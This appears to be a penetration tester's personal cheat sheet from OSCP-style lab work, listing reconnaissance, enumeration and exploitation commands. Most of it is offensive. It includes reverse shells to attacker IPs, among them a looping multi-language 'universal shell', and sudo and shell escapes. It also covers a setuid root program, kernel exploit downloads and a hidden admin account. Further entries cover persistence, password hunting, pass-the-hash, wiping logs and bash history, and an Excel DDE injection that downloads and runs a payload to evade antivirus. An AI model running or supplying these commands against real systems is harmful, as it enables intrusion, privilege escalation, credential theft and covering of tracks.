	Headers:
		GZIP header: 1f 8b
	Linux commands
		Create unix passwd: 	mkpasswd -m md5 password salt
		Check drives:		sudo fdisk -l
		Start SMB service:  impacket-smbserver awae /var/tmp/awae

	Text searches and manipulation:
		convert bin to hex: xxd somefile.exe | cut -d" " -f 2-9 | sed 's/ //g' | tr -d '\n' > hexdata.txt
		grep -rnw /var/www/html -e "^.*something.*smthelse.*" --color
		egrep '\$addslashes.*=.*' /var/www/html/ -r --color
		egrep 'sometging.*someelse.*' /var/www/html/ -r --color

	Network:
		tcptrack -i eth0	-Connections in real time
		iptables -A INPUT -p TCP --destination-port 13327 \! -d 127.0.0.1 -j DROP	-Setup host firewall rule
		tcpdump -nni tap0 icmp		-Capture ICMP ping only
		tcpdump -nnAi em0 port 80
		tcpflow -cr capture.pcap	-Read creds
	Wireshark:
		http.request.method == GET && http.request.contains "password"
		http.response.code != 304
		http.user.agent && !(https.user_agent contains Mozilla)
		http.referer == "http://google.com" && http.request.uri contains php

	Escape restricted shell:
		echo os.system("/bin/bash") or /bin/sh -i
		python -c 'import pty; pty.spawn("/bin/bash")'
		python -c 'import pty; pty.spawn("/bin/sh")'
		In python: dir() ... restricted_terms ... restricted_terms.pop(0)
		ssh ryuu@10.11.1.72 -t "() { :; }; /bin/bash" -If immidiately logged out (taken from tr0ll2)

	Logs:
		tail -f /var/log/apache2/access.log		-Check for incoming connections during attack
		Enable PostgreSQL logging: ...\pgsql\data\amdb\postgresql.conf set:    log_statement 'all'   then restart the service, logs are in ...\pgsql\data\amdb\pgsql_log
	Poweshell foo with logs:
    dir | sort LastWriteTime | select -last 1   -last changed file
    Get-Content .\postgresql_12.log -wait -tail 1 | Select-String -Pattern "version"
    Check for smth containing words resourseid or syntax error:
    Get-Content .\postgresql_13.log -wait -tail 100 | Select-String -Pattern "(resourceid( >|\))|syntax error)"
		log -tail 100 | Select-String -Pattern error -context 0,2    -show 2 lines after the error

	WGET and parse:
		cat index.html |grep "href=" |cut -d"/" -f3 |grep "cisco\.com" |cut -d'"' -f1 |sort -u	-Parse html for domain names
		grep -o '[A-Za-z0-9_\.-]*\.*cisco.com' index.html |sort -u >domains.txt		-Same output to file
		host www.cisco.com | grep "has address" |cut -d" " -f4		-Get an IP of cisco.com
		for url in $(grep -o '[A-Za-z0-9_\.-]*\.*cisco.com' index.html |sort -u); do host $url|grep "has address"|cut -d" " -f4;done	-Extract IP of cisco.com from index.html

	Netcat:
		ncat -lvp 4444 -e cmd.exe --allow 192.168.2.2 --ssl	-Bind listener shell with ACL and SSL
		ncat -v 192.168.1.3 4444 --ssl
    Port scan:		nc -nvv -w 1 -z 10.3.3.47 70-90

	Enable RDP on remote host:
		netsh advfirewall firewall add rule name="Open Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
		On old machines:
			reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
			netsh firewall set service type = remotedesktop mode = enable
			net users pronto prontissimo /add
			net localgroup administrators pronto /add

	FTP:
		/etc/init.d/pure-ftpd restart
		atftpd --daemon --port 69 /tftp		-Start tftp server, share /home
		tftp -i 10.11.0.76 GET nc.exe	-Connect remotely and download /home/nc.exe file

Windows commands
		tasklist | findstr /i calc
		taskkill /f/ IM calc.exe
		netstat -an|find "4444"
		net user "user" | findstr "active"
		net accounts
		net share
	PS:
	  powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
		Get-Service -Name WinRM | Format-List
		Get-Service -Name WinRM | Format-List -Property *
		Get-Acl C:\Temp\shared.txt | Format-List
		Get-Content C:\Temp\shared.txt | Select-String "String to find"
		Ream alternate streams: Get-Item * -Stream*
		Failed logons: Get-EventLog -InstanceId 4625 Security | Format-List
									 Get-Winevent -FilterHashtable @{logname="security"; ID=4625} | FormatList
		Search files: gci -Path C:\Shared\Folder *.txt -Recurse
		Sch Tasks: Get-ScheduledTask -TaskName *some task* | Export -ScheduledTask
		Firewall rules: Get-NetFirewallRule -Description your_rule | GetNetFirewallPortFilter
		dir | sort LastWriteTime | select -last 1
		Get-Content .\postgesql_11.log -wait -tail 1 | Select-String -Pattern "select version"

Mount drives:
		locate NFS service (port 2049) (https://metasploit.help.rapid7.com/v1.1/docs/metasploitable-2-exploitability-guide)
		showmount -e 192.168.186.147 OR rpcinfo -p 192.168.186.147
		mount.cifs '\\10.11.1.31\wwwroot' /root/mega/creds/31/share
		mount -t nfs 192.168.30.53:/shared /mnt

--------------------------------------------------------------------------------------------------------------------

Gathering
	Google dorks: https://www.exploit-db.com/google-hacking-database/
		site:"megacorpone.com" -site:"www.megacorpone.com" filetype:ppt "penetration"
		intitle:"VNC viewer for Java"
		inurl:"robots.txt"
		intitle:"-N3t" filetype:php undetectable	-Sites compromised with backdoor
	DNS and Mail:
		host -t ns megacorpone.com
		host -t mx megacorpone.com
		host -l megacorpone.com ns1.megacorpone.com	-Check for zone transfer
			 nmap --script=dns-zone-transfer -p 53 ns2.megacorpone.com
		dnsenum
		theharvester -d cisco.com -b google >google.txt		-Email harvest from google.com
	NMAP:
		Initial scan:
		nmap 10.1.1.0/24 --exclude 10.1.1.34 10.1.1.45
		echo 10.1.1.0/24 > good.txt; echo 10.1.1.34 10.1.1.45 > avoid.txt; nmap -iL good.txt --excludefile avoid.txt
		nmap -Pn --top-ports 20 192.168.186.0/24 --open -T4
		nmap -sn 192.168.1.0/24 -oG ping-sweep-nmap.txt
		grep Up ping-sweep.txt | cut -d " " -f 2

		nmap -p 80 192.168.1.0/24 -oG ping-sweep-nmap.txt
		grep open web-sweep.txt |cut -d" " -f2

		nmap -sT -A --top-ports 20 192.168.1.0/24 --open -oG top-port.txt
		nmap -v -p 80 --script all 192.168.1.1

		ls -l /usr/share/nmap/scripts/smb*	-List scripts
		ls /usr/share/nmap/scripts/*vuln*	-Vuln check scripts

	SMB (tcp 139, 445) enum:
		smbclient -L //192.168.186.147 (commands - list, dir,  mget * )
		rpcclient -U "" 192.168.1.1
		smbclient -U testuser //localhost/report-upload/
			no password, hit <Enter>
			if logged try srvinfo
		enum4linux -v 192.168.1.109
		nmap -p 139,445 --script smb-enum-users 192.168.1.0/24
		nmap -p 135,139,445 --script smb-enum-shares 192.168.1.0/24
		nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.11.1.201


		/root/mega/exploits/samba28 (made of 10.c) use exploit/linux/samba/trans2open (Unix Samba 2.2.0 to 2.2.8)
			./samba28 -b 0 -v 10.11.1.28
		use exploit/multi/samba/usermap_script (Samba 3.0.20 - 3.0.25)
		use exploit/linux/samba/lsa_transnames_heap	-Linux 3.0.21-3.0.24
		EthernalBlue (zzz_ezploit.py creating user cplsec P@ssw0rd123! on the target)


	SMTP (tcp 25) enum:
		nc -nv 192.168.1.2 25
		HELO a
		EXPN root	-Enumeration
		VRFY user	-Enumeration
	Writing mail:
		MAIL FROM:root
		RCPT TO:root
		DATA Hello there
		.
	Enum automation:
		for user in$(cat users.txt); do echo VRFY $user |nc -nv 192.168.1.2 25 2>/dev/null |grep ^"250"	-Does not always work
		use smtp-user-enum script from pentestmonkey


	SNMP (udp 161):
		onesixtyone -c community_strings.txt -i listIP.txt
		onesixtyone -c snmp_strings.txt -i hosts.txt | cut -d " " -f 1 >> snmp_hosts.txt
		snmpwalk -c public -v1 192.168.1.112 <snmp code here>
		for host in $(cat snmp_hosts.txt); do  snmpwalk -c public -v1 $host 1.3.6.1.4.1.77.1.2.25; done |cut -d" " -f4 |sort -u

		1.3.6.1.2.1.25.1.6.0 System Processes
		1.3.6.1.2.1.25.4.2.1.2 Running Programs
		1.3.6.1.2.1.25.4.2.1.4 Processes Path
		1.3.6.1.2.1.25.2.3.1.4 Storage Units
		1.3.6.1.2.1.25.6.3.1.2 Software Name
		1.3.6.1.4.1.77.1.2.25 User Accounts
		1.3.6.1.2.1.6.13.1.3 TCP Local Ports

	VNC:
		vncviewer 192.168.1.116::5901
		hydra -p "password" vnc://192.168.1.117:5901
		hydra -P /usr/share/metasploit-framework/data/wordlists/vnc_passwords.txt -s 5901 192.168.1.116 vnc

	OpenVAS:
		root@kali:~# openvasmd --user=admin --new-password=NEW_PASSWORD
		root@kali:~# service openvas-scanner start
		root@kali:~# service openvas-manager start
		root@kali:~# service greenbone-security-assistant start
		firefox https://127.0.0.1:9392

------------------------------------------------------------------------------------------------

Universal shell (change IP to yours):
while true;do bash -i >& /dev/tcp/IP/1337 0>&1;nc -e /bin/sh IP 1337;perl -e 'use Socket;$i="IP";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};';python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);';php -r '$sock=fsockopen("IP",1337);exec("/bin/sh -i <&3 >&3 2>&3");';ruby -rsocket -e'f=TCPSocket.open("IP",1337).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)';sleep 5;done

Priv escalation
	Reverse shell:
		bash -i >& /dev/tcp/10.11.0.76/444 0>&1
		rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.114.137 443 >/tmp/f
	Add SSH keys: ssh-keygen -t rsa -b 2048
	root.c:
	#include <stdlib.h>
	#include <unistd.h>

	int main() {
		setuid(0);
		setgid(0);
	system("/bin/bash");
	}

	Sevices examination:

		cat /etc/crontab
		ls -la /lib/systemd/system/debug.service (https://in.security/lin-security-walkthrough/)
		find / -perm -2 ! -type l -ls 2>/dev/null	-Look for cron scripts, if any
		find / -perm -4000 -o -perm -2000 -exec ls -ldb {} \;
		find / -perm -6000
		find / -perm -u=s -type f 2>/dev/null
		find / -perm -g=s -o -perm -u=s -type f 2>/dev/null
		find / -user flag00 2>/dev/null		-Files being run under user
		find /var/www/html -type d -perm -o+w - find writable dirs
		find / \( -perm -2000 -o -perm -4000 \) -exec ls -ld {} \; 2>/dev/null

		Find recent files:
			find -mtime 0 - find files tampered less then 24 hrs ago
			touch --date "2013-01-01" /tmp/timestamp
			find /var/log -type f -newer /tmp/timestamp

		sudo -l		-Allowed to run
			LESS, XXD, STRACE, TASKSET (https://gtfobins.github.io/)
			SOCAT:
				Bind shell: sudo socat TCP-LISTEN:9999,reuseaddr,fork EXEC:sh,pty,stderr,setsid,sigint,sane
				To connect: socat FILE:`tty`,raw,echo=0 TCP:192.168.114.142:9999

			ssh--> sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
			vi-->	:!bash
			vi-->	:set shell=/bin/bash:shell
			awk (also works for mawk)--> awk 'BEGIN {system("/bin/bash")}'
			find-->	find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
			perl-->	perl -e 'exec "/bin/bash";'


		ls -ahlR /home/; ls -ahlR /root/

		/bin/bash -i >& /dev/tcp/10.11.0.76/443 0>&1	-Inject this reverse shell into cron script

		dirty (40839.c )	- Linux 2.6.32, 2.6.22 (Linux 2.6.22 - 3.9)	gcc -pthread 40839.c -o dirty -lcrypt
		linux2421		- Linux 2.4.7(crashed)
		9.0 (28718.c)		- FreeBSD 9.0
		centsos45 (9542.c)	- CentOS 4.4 - 4.5 (Linux 2.6 - 2.6.19)
		linux26 (5093.c)	- Linux (2.6.23 - 2.6.24)
		18411.c			- Linux 2.6.39 < 3.2.2 (Ubuntu 11.10, kernel 3.0.0-12)
		37292.c	(ububtu)	- ubuntu 14.04 (Linux 3.13 - 3.19)

	Windows:
		check services for exe paths
		upload /var/www/html/accesschk.exe
		accesschk.exe -uwcqv "Authenticated Users" * /accepteula
		accesschk.exe -uwcqv "Power Users" * /accepteula
		icacls scsiaccess.exe		-Check permissions on file (Look for W or F tag) and substitute if possible

		KiTrap0D (KB979682)	use exploit/windows/local/ms10_015_kitrap0d
		MS11-011 (KB2393802)
		MS10-059 (KB982799)	Churraskito.exe "C:\windows\system32\cmd.exe" "net user 123 123 /add"
		MS10-021 (KB979683) 	MS office
		MS11-080 (KB2592799)	megacorp/exploits/windows-kernel-exploits/MS11-080
		MS12-042 (KB2709715)

KiTrap0D (KB979682), MS11-011 (KB2393802), MS10-059 (KB982799), MS10-021 (KB979683), MS11-080 (KB2592799)

	After escalation:

		run persistence -U -i 30 -p 443 -r 10.11.0.76

		net user pronto prontissimo /add
		net localgroup administrators pronto /add
		net localgroup "Remote Desktop Users" pronto /add

		C:\Windows\system32> dir /s *pass* == *cred* == *vnc* == *.config*
		C:\Windows\system32> findstr /si password *.xml *.ini *.txt
		C:\Windows\system32> reg query HKLM /f password /t REG_SZ /s
		C:\Windows\system32> reg query HKCU /f password /t REG_SZ /s

		useradd -g 0 -s /bin/bash -m Tom	-Linux	(root group 0)
		usermod -aG sudo Tom
		adduser			-FreeBSD

	Client sideMS08-067: Microsoft Windows Server Service Crafted RPC Request Handling Remote Code Execution
		MS12-037 (24017 html file)	-Once run in IE8, listen 4444 wget -O exploit.html https://www.exploit-db.com/exploits/24017

Public exploits:
	Linux:
		wget -O exploit.c https://www.exploit-db.com/exploits/18411	-CVE 2012-0056 root for >=2.6.39 (Ubuntu 11.10, kernel 3.0.0-12)
		gcc exploit.c -o exploit	-Compile to binary
	Get Win compiler:
		sudo apt-get install mingw-w64
		i686-w64-mingw32-gcc slmail-win-fixed.c -lws2_32 -o s.exe	-For x86
		x86_64-w64-mingw32-gcc -o main64.exe main.c	-For x64

		i585-mingw32msvc-gcc file_name.c -lws2_32 -o exploit.exe
		wine exploit.exe	-To run Windows file in Linux
	Windows:
		wget -O ms11-080.py https://www.exploit-db.com/exploits/18176	-MS11-080 (WinXP and 2003)
		python pyinstaller.py --onefile ms11-080.py			-Create an exe out of python

xfreerdp /u:administrator /d:thinc /pth:aad3b435b51404eeaad3b435b51404ee:0598acedc0122622ad85afc9e66d329e /v:10.11.1.221

---------------------------------------------------------------------------------------------------------
Cleaning the traces
	Find and remove ossec-alerts.log, access.log, httpd-access.log
	echo > .bash_history

----------------------------------------------------------

AV bypass:

DDE inj in xlsx
=cmd|'/c powershell.exe -w hidden $e=(Copy-Item -Path c:\Te\12345.txt -Destination C:\Users\test\12345); powershell -e $e'!A1
=cmd|'/c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString(\"http://1.2.3.4/test.exe\"); powershell -e $e'!A1

HTTP2 https://www.youtube.com/watch?v=YHOnxlQ6zec
In wireshark: http2.data.data && http2 contains username
nghttp -v -u http://http2.sec642.org/../../../../etc/passwd doesn't work, need to be encoded
curl2 --http2 http://http2.sec642.org/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd
curl --http2-prior-knowledge --data "status=on" http://localhost:8080/index.ph

ADFS:

$msolcred = get-credential
connect-msolservice -credential $msolcred
Get-MsolUser -All | ft -AutoSize
